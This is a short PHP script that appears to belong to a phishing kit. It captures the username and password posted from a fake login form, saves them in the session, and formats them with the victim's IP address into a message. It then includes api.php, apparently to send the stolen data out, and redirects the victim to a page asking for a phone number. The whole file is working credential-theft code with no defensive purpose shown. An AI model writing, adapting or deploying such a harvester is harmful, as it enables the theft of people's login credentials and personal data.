<?php

session_start();



$username = $_SESSION['Passport'] = $_POST['Passport'];
$password = $_SESSION['Access'] = $_POST['Access'];


$hexor = '
# Login ✉️
# USER : '.$_SESSION["Passport"].' 
# Password : '.$_SESSION["Access"].' 
# IP : '.$_SERVER['REMOTE_ADDR'].' 
';



include("api.php"); 



header('Location: ./Phone_number.php');


?>


